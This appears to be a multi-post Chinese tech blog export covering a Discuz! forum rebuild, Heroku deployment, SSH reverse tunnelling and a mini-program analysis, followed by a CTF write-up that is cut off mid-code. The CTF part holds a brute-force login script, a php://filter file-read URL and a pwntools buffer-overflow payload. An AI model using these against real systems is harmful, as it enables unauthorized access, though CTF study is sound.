重建折腾记辣鸡服务器配置出了一堆问题之前都没有自己动手在裸机上配置WEB环境来着，Linux也没有多少经验，于是乎上手就比较痛苦。 下面是一堆废话emmm 不想看就直接跳过这节吧。 租服务器的时候图省事直接装了PHPStudy，里面集成了LNMP环境，然后网站什么的直接可以在上面配置。 之前搭了几个测试用的网站，运行都没什么问题，能正常访问。 然而这次我建了一个新的PHP环境，打开端口，访问的时候居然报403无权限，但是其他的网站都没这个问题。 看到网页上是nginx报的错，很自然怀疑就是它的问题。检查了一下配置没发现问题，于是重装了一下。这回直接报500内部服务器错误了。（我愣住了 看了一下错误log，发现很多是无权限，还有的找不到文件？？？ 复制粘贴搜了一下，怀疑是动态链接库的问题，于是ln尝试创建链接，然而不成功。 然后不想管了，关闭nginx服务，启动apache服务，这回还是403，其他的网站就没问题，绝了。 换回nginx，将配置文件中的user由www更改为root，再试居然好了！看来果然是权限的问题，然而我之前好像并没有改过什么配置，也不清楚www用户为啥就没权限了。 root毕竟不太安全吧，于是又改了回去，403了。 登录服务器看了一下，几个网站目录下就只有新建的这个用户组是root，修改了目录权限，允许others执行，再访问，没问题了。 但很奇怪啊为啥就不行啊。 于是又重装了一次nginx，同时还卸掉了它的防火墙，这次没问题了emmm。再装回防火墙，又炸了。 WAF的问题啊。 这时候后台改参数也有报无权限的，就很懵逼。 于是干脆直接reboot好了。 （有句话说得好，重启解决绝大部分问题 进入后台，先关闭nginx，重装WAF，再开启nginx。这回终于没毛病了。（x 重建8班班网重建其实类似于搬家，于是看了几篇关于Discuz!搬家的教程，发现距今都有一段历史了。 去官方论坛找到了最新的X3.4版本的下载链接，发现指向了gitee，刚开始还觉得有点意思，然而当我点开链接发现连接不上gitee服务器，难道炸了？？？换了一个网络，连上了。（吐槽一下辣鸡宽带，估计是DNS出了点问题8 啊不是！！！ 别想着啥都想装最新的，得先考虑你要重建/恢复的系统是什么版本的啊！还要注意PHP的版本，以及语言编码（GBK/UTF8/BIG5/？）（就因为这个删掉又重建了好几个版本 论坛的版本可以在你备份的数据库.sql文件头部注释里看到。（这个还是后面重建10班班网时才发现的 不要像我一样装了发现用不了嘤嘤嘤。 upload文件夹打包传到服务器上，解压，然后访问网站。 草怎么又403了。 检查了一下文件发现是root所属，原来是之前一直以root身份操作的问题，更改用户组为www，这回能正常访问了。 按照安装流程全新安装Discuz!系统。这里的数据库要自己提前建好，表前缀和你要重建的一致，一般就不用更改。 安装完成，访问主页是默认的界面。（略） 根据官方的搬家教程，把utility/restore.php文件上传到网站的data/目录下，再把要恢复的数据库整个目录也上传到data/下，然后通过网站域名/data/restore.php访问数据恢复页面。 然而这里我被自己的WAF给拦住了233。 开了白名单再导入，这时候过了一段时间报504了emmm。（我又懵了，难得让我见到了好多错误页面，我没事的嘤嘤嘤 重试，如旧，同时发现cpu是100%在跑的（唉性能果然不咋样。 搜了各种资料，把nginx的超时和PHP执行时间都改了，还是504… 看了一下.sql文件，干脆不用整个工具，直接导入mysql好了啦。 虽然期间还报了几个错，但还是导完了呢。 访问主页，哇好惊喜啊，之前的分类、帖子什么都回来了。 用原始的创始人账号登录后台，更新缓存。 这里也折腾了老半天，不是安装论坛系统时候创建的，而是重建的老用户。 毕竟整个数据库都改回去了嘛。 至于忘记密码，emmm后面再说。 再刷新主页，这回数据基本能正常访问了，页面配置也恢复到了之前的状态。 （如果有的话）恢复logo、favicon、attachment、avatar、plugin、template等。 这里由于之前只备份了logo，其他数据基本没备份（或者说我的硬盘里没备份）emmm，就么的办法了。 看了看上面的帖子，全是黑历史啊……（黑脸.png 用户数据都恢复了，理论上能用原来的信息进行登录。 然而图片什么的都没了，之前很多外链的图片、插件都失效了，其实问题也不大吧。 不过能重建了也总比没有要好呀！嘻嘻嘻。 毕竟这个版本有很多安全漏洞了，出于安全考虑，这里就不公开了啦。 重建10班班网上面说了云平台End of Life的时候没有备份这个数据的。 但是我找遍了硬盘，终于翻出了那时候备份的部分数据。 有了上面重建的经验，本以为就很轻松上手的，没想到还是遇到了一堆问题。 首先还是版本的问题。 本以为X3.2版本已经够老了，没想到这里最后一直回退到了X2版本（噗 鬼懂得我重建了多少次网站emmmm 期间有一次是PHP版本错了，毕竟之前的版本一般只支持5.x来着，然后我装了7.x。 有一次是MySQL数据库炸了，装完之后主页都打不开，直接报的database error。然后卸掉了数据库，换了老一点的版本，发现装好了永远启动不了。最后发现是之前卸载有残留，绝了。清了一遍残留重装，再重启服务就好了。 还有一次是Discuz版本装的X2.5，本来挺开心的，导完数据更新完缓存，点开帖子就报database error，说找不到某某记录吧。最后版本降到X2终于好了，估计是版本升级过程中修改了这部分数据库或操作数据库的代码吧。 还有每一次都遇到了.sql导不进数据库的问题，因为这个数据库更大了，即使改了nginx和PHP的配置，在网页上导入还是永远报504，最后是一边看着CPU状态，一边从后台导入的。前端报了504，CPU还在跑，虽然SQL还报过好几种错但最后还是导入完成了。。（我太难了 噢还有那个创始人密码忘了的问题。 查了一下资料，一个方案是尝试登录UC_Center，如果成功登录的话可以在里面更新创始人的密码，再用更新后的密码登录Discuz的管理后台就行了。（这里用的就是这个方案） 另一个方案是修改数据库里面的用户相关的表，先改成一个比较简单的密码（好像是MD5加密），登录进去再修改。这里没用试过就不说了啦。 重建完成之后访问主页。 草，原来这个是那时候更新版本前的最后一次备份emmm （看亚子是第四代，最后更新的是第五代了，看了半天才想起来） 找了一下发现部分附件和头像之类的也有备份（更古老的数据了）。于是又折腾了一会儿把能恢复的数据给恢复了。 于是乎最后重建出来的是2013年1月的备份了。 怎么说好呢，其实问题也不大吧，真·回忆啊！ 这个版本的安全漏洞更多了，同样就不公开了，看看就好了啦。 emmm下面这个是恢复不了的第五代版本（真就只有这张图了嘤嘤嘤）。 一些想法 Linux权限管理还是很严格的，这回体验到了，有空再研究研究。 选对合适的版本，不要总想着用最新的。 看了Discuz!系统之前的老版本，都是把GBK编码的版本放在前面，不过现在都是推荐安装UTF-8编码版本了。 包括其他很多地方基本上就UTF-8了，感觉也算是个趋势吧，毕竟是国际编码，通用性强嘛。 去Discuz!官方论坛看了看，感觉明显冷清了。包括在后台看插件应用市场，基本上就变成了商业化的交易了，就有点怀念N年前那时候社区还很活跃，有一堆免费的还互相分享来着。（不过也算是时代趋势吧233 其实还找到了以前可能折腾过的各种建站系统233。 然后就想到纸飞机了嘤嘤嘤。今天去看了一下，发现纸飞机还能访问i，只是论坛关闭了，个人空间和视频区还是开放的，而且版本是X3.4算是最新的大版本了。（不知道于老板是不是还维护过 写这篇blog的时候又去OpenShift看了一下，发现现在都升级到 V4.2 版本了。增加了很多现在很实用很热门的Serverless、 CI/CD之类的，现在的Starter plan也是免费的，不过感觉加了不少限制吧（毕竟减少滥用节约资源嘛）。感兴趣的还可以看看下面的链接。 版本介绍：https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/ 产品介绍：https://www.openshift.com/products/online/ ​ 备份是个好习惯，CTRL+S也是。 看了看之前的帖子，发现全都是黑历史…… 然后惊喜地发现，之前的外链难得有几个还能访问，进去一看发现是以前的教育博客，居然一直运营到了现在，而且以前的文章都在。全是回忆啊。。 等我有空再把上面以前发的文章爬下来备份一份23333. 有问题欢迎来交流哈哈哈。 溜了溜了喵","path":"2020/01/09/Idea_RebuildClassWebsite/"},{"title":"NUAA_iCal_Web在线版本部署","text":"主要是简单记录一下Heroku的部署，毕竟一不小心就忘记该怎么折腾的了… （其实应该两周前写这篇blog的，现在已经忘了很多了嘤嘤嘤 Cause之前折腾了一两个月，做了个把课表导出到ical日历文件的小jio本，即 NUAA_ClassScheduleGitHub链接：click herehttps://github.com/miaotony/NUAA_ClassSchedule 其中有一个TODO是搭建一个web端，实现在线导出。 实际上，在教务系统加入验证码之前，已经和奶冰一起做了一个可以用的web端了，只不过只是简单测试还没公开啥的。 然而，这个验证码一加就麻烦了……之前做的登录显然就不成功了。 解决方案的话，在本地，是通过把验证码下载下来，PIL调用本地图片查看器来显示，进而在命令行里输入。 不过web端就有点麻烦了。 但怎么说好呢，不妨碍用同样的思路解决这一问题呢嘻嘻嘻。后面再说。 其实到写这篇blog为止还没弄清楚他验证码的具体机理。（等我考完试有空再折腾好了喵 不想往下看又想体验NUAA_iCal_Web在线版本的，点这里访问吧。 DeployHeroku简介偶尔有一天在转GitHub的时候，看到某个项目下有个网页端的界面，README里面也有个deploy with heroku之类的图标按钮。点进去看了看，然后再查了查资料。 Heroku is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud. Heroku是一个支持多种编程语言的云平台即服务。在2010年被Salesforce.com收购。Heroku作为最开始的云平台之一，从2007年6月起开发，当时它仅支持Ruby，但后来增加了对Java、Node.js、Scala、Clojure、Python以及（未记录在正式文件上）PHP和Perl的支持。基础操作系统是Debian，在最新的堆栈则是基于Debian的Ubuntu。 好东西呀！ 发现heroku可以在一定程度上免费搭建网站，当然前提是要有一个wsgi接口之类的，大概意思就是说需要让你的东西能通过网络访问得到。 其实那时候我连wsgi是啥都不知道…… 官网链接：https://www.heroku.com/ 具体的定价策略参见这里。 Free版本的话，未认证用户每个月550小时免费动态时长，认证用户（好像是绑定银行卡）1000小时；30分钟无访问无活动的话会自己睡大觉，不会占用你的宝贵时长；提供二级域名，还可以自己绑米。 对于nuaaical来说，这个完全够用了呢！ 那就干脆折腾一下好了。 NUAA iCal Web端搭建需要一个wsgi接口之类的嘛，flask、django这些现成的就行。 本来就啥也不知道也没玩过，看来一下flask挺简单的，于是就简单学了一下flask框架。 然而真正搭建的过程中遇到了一堆奇妙的bug，本地跑着好好的，上了heroku就炸了。（这个不细说了 实际上代码就是从本地版本改的，毕竟在开发的时候留了很多现成的接口了，改一改调用一下函数之类的就完事了。 不过这个验证码折腾了老半天。 这里的策略是，当你访问页面的同时，后端去访问教务系统，把验证码图片爬下来送给前端，同时建立了一个与你有关的session。 当你post用户名密码及验证码后，后端利用同一个session去访问教务系统，进而爬取课表及考试信息，生成icalendar日历文件，而后以附件下载的形式构造response，从而得到属于你的ical课表。 当然，一定程度上安全一点，这个session在构造完response之后就销毁了，不保留在云平台上。 （这样其实还是没搞清楚验证码的机理，一定程度上相当于绕过了而已。 其实到这的话，本地搭建就结束了。 不过还考虑了一下复杂的生产环境…… 比如说登录信息重复post，而原来的验证码就不再有效了。 这里其实想了几种方案，但是行不通。最后干脆折腾了一波HTML，加了个前端界面，如果没登陆成功就提示一下，然后过一会儿返回主页好了。233 （有更好的方案欢迎提出喵！ 比如未登录情况下直接访问导出ical的页面 这个也是直接返回主页了。不过这里这个判断折腾了老半天。 最后的方案是在flask的session里建立了一个属于当前session的bool变量，默认为False，登录以后设置为True。 之前直接写在程序的全局变量里，本地跑着好好的，上云平台就炸了……再见。 还写过在flask的g变量里，后来仔细查了资料，g变量好像是只在当前页面请求中有效，意思就是作用范围不一样，于是否决了。 教务系统连接已重置 这个是他教务系统的问题啊，难顶了。还是折腾了老半天才发现这里的问题。 又改了改登录的延时，这回变成随机延时了，而且时间也加长了。 而且还把爬虫的UA改成了当前浏览器的UA。IP的话好像没办法了。 问题有所改善…然而偶尔还存在。 大不了多试几次就好了。 etc. 其实还有个打算是做个前端ifram框架之类的直接嵌套官方的登录界面，然后登录成功后再利用登录信息来爬取课表，这样一定程度上可能还更安全一点。再说吧…… Heroku搭建下面来简单记录一下Heroku的部署。 注册一个账号 网址https://www.heroku.com/ 略。建议用gmail，不过也看到用国内邮箱也成功的。 安装Heroku CLI 命令行接口 Win-x64：下载地址 其他环境的见官网好了。https://devcenter.heroku.com/articles/heroku-cli 安装完之后就可以在命令行用heroku命令了。 登录 heroku login 会弹出网页登录验证，或者在命令行登录。 准备好app 你看他支持的语言挺多的呢。 我这里用到的就是python啦。 这个在上一节已经搭建好了喵。 创建app heroku create 这时候同时建立了一个名为heroku的git remote仓库，连接到了你本地的git仓库。 当然也可以现在网站上创建一个应用，再clone heroku git:clone -a nuaaical cd nuaaical 这里前提是建立好了名为nuaaical的应用了。 建立依赖相关的requirements.txt 略。 指定执行的入口 这里算是一个坑吧，折腾了好久才发现。 你必须先在代码目录下建立一个名为Procfile的文件，在里面写上你要他执行的命令。比如执行一个python文件之类的。 在这里用的是gunicorn来建立一个web应用。（flask只用于本地测试使用 web: gunicorn web:app第二个web是文件名（web.py），app是flask实例化的对象啦。（代码里写的app = Flask(__name__) 指定用构建语言（可略？） heroku buildpacks:set heroku/python 显示指定用python来构建打包（网上有的说不指定会报错？ 部署代码 终于可以部署了呀！直接push好了。 git push heroku master 如果不行的话加上-f强制push（小心一点）。 然后可以看到部署的日志，如果有问题就再看看。 没问题的话，效果类似下面的。 看看你的网站吧 heroku open 然后会调用你的浏览器打开。 或者自己在浏览器访问就好了。 嘻嘻嘻，到这就结束啦~ 拓展当然还有一些常用命令，比如： 查看日志(debug必备了) heroku logs --tail 看一下还有多少剩余时长 heroku ps 打开app服务 heroku ps:scale web=1 关闭app服务 heroku ps:scale web=0 etc. 官方文档Getting Started on Heroku看这里 https://devcenter.heroku.com/start 除此以外，Heroku还支持pipeline，还可以授权从GitHub上同步部署，还有容器啥的…… 感觉还是挺不错的呢！ Achievements部署好的web端网址： https://nuaaical.herokuapp.com/ 欢迎来试试呀！ 第一次访问可能会花一些时间，等一等吧。 如果不成功的话刷新一下页面（但不要重复提交登录信息），或重新开一个页面访问。 同时多人访问的话也可能会有问题（没试过），那就再试试吧。（摊手 好了我知道这个页面丑了。现学的HTML，别说了。 其实之前奶冰奶冰奶冰冰做了一个前端的↓ 后面再折腾吧咕咕咕 欢迎来贡献代码呀！ 其实之前还折腾了老半天，尝试了在Azure上部署，也成功了。 需要在VSCode中进行部署，然后在配置里设好启动命令（也可以是一个文件）。 不过现在Azure服务到期了。部署的网站也停止了呢。 截个图纪念一下吧。 （hackathon的时候白嫖的Azure还是挺爽的233 同时，代码开源在GitHub上了。欢迎来点个star，提个PR喵！ https://github.com/miaotony/NUAA_iCal_Web 仅供学习研究，未经允许禁止商用，谢谢。 文章中不免存在问题，欢迎提出。 Reference https://devcenter.heroku.com/ https://www.jianshu.com/p/191248ad2639 浪够了，继续准备考试。（真难顶…… 期末冲冲冲！ 说不定这是今年最后一篇blog了喵。 溜了溜了。","path":"2019/12/29/Tech_NUAAiCalWeb_deploy/"},{"title":"小想法 | 基于VSCode和ssh实现远程编程/炼丹","text":"Cause在内网有一台服务器，能连接外网但由于没有公网 IP 而无法在外网直接访问，之前想要在上面跑程序的时候，就得通过远程桌面进行操作。虽然 Teamviewer 速度还可以，但总感觉有点不太爽…… 很久以前（大概一两个月前）就在逼乎上看到过一篇文章说可以 使用vscode进行远程炼丹 （原文见 Reference #1 噫！我来兴趣了，而且其实早就想试试了，然而之前在忙别的没空折腾（其实现在也没空），就是前几天在配服务器环境的时候（麻烦到爆炸，最讨厌配环境了），一想干脆就再折腾一下，弄好远程炼丹（编程）吧。 于是乎就这样连Linux命令都不知道几个的憨憨瞎折腾了一两天的ssh，终于实现了远程炼丹，贼有成就感嘻嘻嘻。 其中遇到了一些奇怪的问题，简单记录一下，也方便我忘了再回来看看吧。 时间有限，VSCode的部分就大概提一下思路，重点是ssh的部分吧…… Guidance for ssh不妨假设如下，记清楚了噢，后面频繁用到的。 computer IP/address info 内网服务器A 172.x.x.x 可以访问外网，但外网不能直接访问A 公网服务器B test.com 可以访问外网，也可被外网访问 能够联网的主机C - 想要在C上对A进行访问 内网服务器A上的设置A设置反向代理到B的 port1 端口 工作原理：1、本地主机和远程主机建立连接；2、远程主机上分配了一个 socket 侦听 port 端口；3、远程端口上有了连接, 该连接就经过安全通道转向本机的端口。 备注：root 登录远程主机才能转发特权端口。 ssh -fCNR &lt;port1>:localhost:22 usr_b@test.com -p 22 -R port1:host:port2 将远程机器的端口映射到本地。port1是公网服务器B的端口，host为本地A的IP，port2是A要映射到公网的端口。usr_b@test.com 用户名@服务器B地址，表示连接到B，以用户usr_b登录。当然test.com也可以是IP地址啦。-f SSH客户端在后台运行-C 允许压缩-g 允许远程主机可远程访问，这里有坑。 （但autossh没有这个选项所以应该影响不大）-N Do not execute a shell or command. 不执行脚本或命令，通常与-f连用。-p 22 表示指定连接到B的22端口，默认就是22啦，如果不是的话设置成B的ssh端口。 注意一下，（网上说）这里有个坑，-g还需要在公网服务器B做下面的设置，设置完后再重启服务。 ＃vim /etc/ssh/sshd_config 新增 GatewayPorts yes 进阶1 autossh由于ssh会自动断开连接，于是利用自动重连工具autossh，保证连接稳定。 首先安装autossh，这里我用的是CentOS系统。其他类似的。 sudo yum -y install autossh 其实我发现yum（的源里）找不到autossh，后来是用wget下载然后手动安装的… screen -S reverse_proxy autossh -M &lt;port2> -CNR &lt;port1>:localhost:22 usr_b@test.com 多了个-M参数，表示从B的port2检测是否断线。同时autossh会在后台运行，-f也不需要了。 这里的screen用于命令行终端切换，给这个界面起了个名叫reverse_proxy，当然没有装screen的话也需要装一下，不过不执行screen这条语句理论上也能用。 注意，port1和port2均需要在B的安全组内设好规则，允许外网访问。 而后看一下有没有运行↓ 可见A已和B建立连接。此处port1为9999，port2为9998，仅用于演示，你完全可以看心情选择你喜欢的端口，当然有的端口有特定功能另外说。 进阶2 开机自启当然，为了连接再可靠一点，确保A重启后还可以连上，可以在A上再设置一下开机自动启动autossh。 有一种方法是在/etc/rc.local里面添加如下内容 su - user_a -c \"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2> -CNR &lt;port1>:localhost:22 usr_b@test.com\" 其中，-i后接的是SSH_KEY_FILE_PATH，即私钥地址，root用户默认为/root/.ssh/id_rsa。user_a是A上的用户，且要求在公网服务器B上，已经有了A主机上用户user_a的公钥（这个在下面B的设置中介绍）。 然后记得给这个文件赋予可执行权限。 chmod +x /etc/rc.d/rc.local 不过看这个文件注释里的说法，好像这个方法不推荐了。 当然还可以使用其他的配置开机自启的方法，我也刚折腾对Linux也不熟，后面再看看吧。 现在你可以reboot试一下了，前提是你能确保用这台服务器的其他人没意见，重要数据记得保存好噢。 这样A上的设置就告一段落了，下面看公网服务器B。 公网服务器B上的设置如果只需要在B上对A进行远程炼丹，那就不需要在B上设置啥了，现在直接ssh就完事了。 ssh -p &lt;port1> localhost 因为已经把A的ssh对应的22端口映射到B的port1端口了呀！ 试一下果然如此。 进阶 免密登录这样每次登录都需要输入密码，是有点麻烦了。 这有个办法，就是把本机的ssh公钥复制到要登录的服务器A的~/.ssh/authorized_key文件中，实现免密登录。 什么，你还觉得太麻烦了？？？ 这里还有一个快办法，就是在B上登录A后执行这个—— ssh-copy-id -i .ssh/id_rsa.pub usr_a@172.x.x.x -i 指向本地的公钥文件，一般在用户的目录下。usr_a 为A上要登录的用户名 然后就可以从B免密登录内网服务器A啦。你现在可以在B上ssh试一下，理论上直接就已经登录好了呢！ 在任意一台联网主机C对A进行访问的实现到这里我有点成就感了，远程炼丹实际上已经实现了。 然而我的初衷是要在一台能联网的主机C上去连接内网A的呀，不行还得再折腾一下啊呜。 首先试了一下直接连接公网服务器B的port1，然而不可行。 不过网上有些资料说是可行的，这个我也不知道呢，可能要问神奇的海螺吧。 根据网上的说法，已经在B上对GatewayPorts进行了设置，也杀死进程重启了服务甚至直接reboot了，然而不知道为啥不可行…… 不过也不是没有办法呢，ssh里还有个正向代理闲着没事干呢，说上就上吧。 在B上继续进行如下配置 ssh -fCNL *:&lt;port3>:localhost:&lt;port1> localhost 表示将B上的port1映射到port3，注意port3也要设置安全组规则啊。 用ss -ant 看了一下，port3的确打开了。 理论上这样的话在C上ssh连接B的port3端口，就可以直接访问到内网A了的。 如果你成功了，那就可以直接跳到配置VSCode的部分了，尽情享受远程炼丹的快感吧！ 喜欢的话可以滑到页面下方，赞赏一下给我买点好吃的（我饿了.jpg 然而我并没有成功…… 看了一下安全组设置，没问题，唉，大不了全开了嘛。还是不行。 这里我难受死了，杀死进程又重来试了好几次，一样没有效果。 再去网上查了查，直到看到一篇文章里提到了这个问题，但他直接用的ssh而没有用到autossh，用他的方案还是没解决问题。不过里面提到了一个命令叫lsof，即“列出打开文件(lists openfiles)”，而在Unix中一切（包括网络套接口）都是文件。这可是个神器啊！ 这里用到的是 使用-i :port来显示与指定端口相关的网络信息。 lsof -i :&lt;port3> # 查看连接port3端口的网络信息 结果类似于这样（忘记截图了），此处port3为仅供演示所用的9988。 # lsof -i :9988 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ssh 658 root 4u IPv6 146251 0t0 TCP *:9988 (LISTEN) 这里我才发现，噫，怎么只监听了IPv6，而没有IPv4啊！ 实际上通过ss -ant也可以发现对应的端口只有tcp6而没有tcp… 然而阿里云实例（安全组内）只有IPv4出口来着，而且也是通过IPv4连接到B的，怪不得连不上呢。（佛了 不过也奇怪了，理论上ssh应该v4和v6都监听的吧。 去查了一下ssh命令，这次强制使用 IPv4试试。 （在B上杀死之前的ssh，再执行下面的命令。记得改成你的端口哈。 ssh -fCNL *:&lt;port3>:localhost:&lt;port1> localhost -4 -4表示强制使用IPv4 这回再看lsof -i :&lt;port3&gt;： # lsof -i :9988 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ssh 954 root 4u IPv4 255331 0t0 TCP *:9988 (LISTEN) 然后再在C上连接B的port3端口。 哇哇哇成功了！ 看来果然是这个问题啊我哭了又笑了。 下面就可以设置VSCode来实现远程炼丹啦！ Guidance for VSCode具体可以参考Reference #1，这里简单操作一下。 在VSCode安装Remote Development开发包（扩展），然后在远程资源管理器里新增一个SSH Target。 在用户的.ssh/config文件内新增你的内网炼丹炉信息。 Host 给你的内网主机起个名（看你心情随意取）HostName 公网服务器B的IP或域名Port 填port3，如果port1能连上就填port1User 填内网服务器A的登录用户名 保存，然后便可以连接试一试了。 连接后输入A对应用户的密码，然后就连上了。打开文件夹还需要再输一次密码。 现在再用前面在B的配置里说的办法，把C主机的公钥放到A里就可以实现免密登录啦！ 呐，这就是在C上连接到内网炼丹炉的效果了↓。 网络延时几乎没有（不过也取决于网络环境），和在本地编程几乎没有差别，爽到爆炸！ 哇哇哇成就感爆棚啊哇哇哇！！！ Summary时间因素，不可避免可能存在一些失误之处，其中也有不少可以拓展之处，欢迎交流提出哈。 本文仅用于学习研究，请在合理合法范围内使用， 未经允许不得商用，转载请署名MiaoTony并保留本文链接，谢谢。 说点题外话吧。 上周末到这周部署NUAA_iCal_Web在线版本弄了一周末（好菜啊第一次弄部署来着…），配服务器环境折腾了老半天（甚至只装好了GPU驱动和anaconda还没配CUDA），配远程炼丹又瞎折腾了一两天，写这篇文章又断断续续地花了好几个小时。 呜下周开始频繁考试了，不敢瞎折腾了嘤嘤嘤。（溜了溜了 Reference 使用vscode进行远程炼丹 SSH反向连接使用Autossh自动ssh 利用阿里云ECS跳板机内网穿透- ssh SSH如何反向代理稳定穿透内网 内网穿透：在公网访问你家的 NAS （还包括frp相关） 从外网 SSH 进局域网，反向代理+正向代理 autossh 穿透，反向代理到内网 ssh-copy-id三步实现SSH无密码登录和ssh常用命令 Linux 命令神器：lsof 使用 autossh 自动重启 SSH 会话和通道 CentOS7添加开机启动服务或脚本 etc. 非常感谢上面这些文章，给了我很多启发呢。","path":"2019/12/21/Idea_RemoteProgramming/"},{"title":"小想法 | QQ小程序【年终报告单/2019年终总结】分析","text":"缘由这两天看空间各种发【我的2019年终报告】，然后我也去测了一下，没想到啥也不用填，申请获取个人信息的权限，报告就出来了。 然而弹出一个遮罩层让你先看个15s的广告…… 超想吐槽，包括页面下面的广告。。 然后看完广告，终于出来了。 正当我截了图返回之后，噫换个性别试试。 好，这回不一样了呀！ 然后再来一次，噫，又不一样了……这让我怀疑他就是假的几张图片而已吧。 我兴趣来了，不如来折腾一下，分析一下这个小程序吧。 （不折腾会死…… 开始折腾 1先来看一看这个小程序的设置，发现只获取了用户信息。看一眼更多资料—— 先确定了这是个个人开发的小程序，看相关的域名除了Tencent家的，主要就是wxa.game-a1.cn 和free-api.heweather.com。 查了一下，后者是一个查天气的API（需要的话可以用一波）（就是很迷惑为啥这里会有这个 前者是一个个人的域名吧，看样子是用的一个开发小程序的平台。根域名还是个博客，里面还有搭建微信小程序的经历。 2ping了一下这个域名，得到IP：47.105.42.112 然后抓了个包，过滤只看关于这个IP的数据包。发现有两个。 前面一个不懂什么鬼填了个表，估计收集了一波使用数据，先不管。重点是后面这个。 很明显是访问了http://wxa.game-a1.cn/wxa/qqnz2019/index.php这个网址。 3浏览器启动，F12大法好呀。 好一个JSON字符串，来分析一下吧。 qrcode很明显是二维码啦，下载下来解码发现调用了qq小程序的接口吧，访问会跳转到这个小程序。 url和url1都是一样的，指向了一个阿里云的对象存储。↓ https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png 多次刷新发现好像的确就那几张图片，改变了一下x.png而已。 而且的确这就是假的图啦。（不然哪来的用户数据可以分析 4既然都知道是几张图片而已了，那顺便就爬下来吧。 PyCharm 启动，来写一写jio本。 写range是因为随便试了一下，本来就没有几张图片而已，然而懒得手动下载。 看结果的确就7张图片。。 呐就这几张了↓ 5看样子小程序获取个人头像，然后再和二维码、上面的任意一张图拼接在一起而已吧。 就是这个form.php，看样子是用来统计使用数据的吧emmm问题不大。 小结哇呜折腾了一个中午好气啊，（有毒 不折腾会死 不管怎么说这个小程序还是有点意思的，至少做的那几张图片还挺不错的哈哈哈。 不过要吐槽这个广告超级讨厌emmm 就这样吧。 爬取图片的源码 和 爬到的图片放到了Github上了，有需要的可以去看看吧。 URL：这是网址 https://github.com/miaotony/Scrapy_2019Year-end_Report","path":"2019/12/04/Scrapy_2019Year-end_Report/"},{"title":"CTF | Asuri战队 2019招新赛 WriteUP","text":"Asuri 招新赛WriteUP 20191117网址： http://139.9.212.218:8000/challenges 官方安排及WriteUP：https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp testflag{this_is_test_flag} misc-签到 base64解码即得到 flag{1_want_jiamus_p0wer} baby-web-九曲十八弯 http://desperadoccy.club:39011/ base64解码 Asuri{view_source&#39;s_power} 快速计算 http://47.102.107.100:39012/ 连续20次在1-2s内判断是否正确，即可得到flag。 import requests import re import time s = requests.Session() r = s.get(\"http://47.102.107.100:39012/\") for i in range(20): time.sleep(1) equation = re.findall(r'&lt;div>(.*)=(.*)&lt;/div>', r.text)[0] print(equation) answer = eval(equation[0]) if answer == eval(equation[1]): values = {'answer': 'true'} else: values = {'answer': 'false'} r = s.post(\"http://47.102.107.100:39012/\", data=values) r.encoding = 'utf-8' print(r.text) Asuri{python_1s_th3_be3t_l4ngu4ge} medium_web_justburp http://139.9.212.218:39010/ 查找网站目录下的文件 访问robots.txt 得到： 访问hint.php 得到一个文件 尝试以admin作为用户名，用以上信息作为密码写脚本进行登录， 然而好像没有成功（有可能有成功的没看到？？？ 难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…加一个if重新来就看到了惹emmm 爆破一波 # -*- coding:utf-8 -*- import requests s = requests.Session() r = s.get(\"http://139.9.212.218:39010/index.php\") r.encoding = \"utf-8\" print(r.text) with open('name-pass.txt', 'r') as file: contents = file.read().split() # print(contents) passwords = contents for password in passwords: values = {'name': 'admin', 'password': password} r = s.get(\"http://139.9.212.218:39010/index.php\", params=values) r.encoding = 'utf-8' if '密码错误' not in r.text: print(r.text) 即可得到 &lt;!DOCTYPE html> &lt;html>&lt;head>&lt;meta charset=\"utf-8\" /> &lt;title>Hi hacker&lt;/title> &lt;/head> &lt;body bgcolor=\"bisque\"> &lt;form action=\"index.php\" method=\"get\">用户名：&lt;br>&lt;input type=\"text\" name=\"name\">&lt;br>密码：&lt;br>&lt;input type=\"text\" name=\"password\">&lt;br>&lt;br>&lt;input type=\"submit\" value=\"登陆\"> &lt;/form> &lt;p>hint:admin用户的密码似乎在某个页面里 &lt;/p> &lt;p> 看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}&lt;/p> &lt;/body> &lt;/html> flag: Asuri{Burp_1s_Gre@t} 其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。然而我现场还在搜它怎么用…… hard_web_php是世界上最好的语言 http://139.9.212.218:39009/ 改cookie重发 访问read_file.php，得到 访问no_flag_here.php ，构造参数进入根目录 然而！emmm这个scandir怎么获取这个flag文件内容啊！！！ 看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 构造file=php://filter/read=convert.base64-encode/resource=+绝对路径 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php 或者 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php 得到一串Base64字符串 PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg== 解码后： flag: Asuri{WEB_WINNER} easy_pwn from pwn import * # 引入pwntools库 import time sh = remote('49.235.243.206', 9001) # 创建与靶场服务器的连接 offset = 0x60+0x8 # 偏移 system_addr = 0x400766 # system函数地址 for i in range(4, 20): sh.recvuntil('Please input your passworld size') sh.sendline(p64(i)) # 向程序发送数据 sh.recvuntil('Please input your password') payload = offset * b'a' + p64(system_addr) # 构造攻击数据 sh.sendline(payload) # 向程序发送数据 sh.interactive() # 将控制流从程序转移到自己这里 完了不会写，嘤嘤嘤 medium_rev#!/usr/bin/env python # encoding: utf-8 # 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc def encrypt_for_each(): index = [ 0] * 100 for i in range(100): tmp = i ^ 77 yield tmp None def encrypt(msg, key): iters = encrypt_for_each() enc = [] for (m, k) in zip(msg, key): e = m ^ k ^ iters.__next__() enc.append(e) return enc def generate_key(): def check_prime(num): if num &lt; 2: return False for i in range(2, num): if num % i == 0: return False return True test = [ 8, 61, 85, 25, 121, 53, 26, 0, 81, 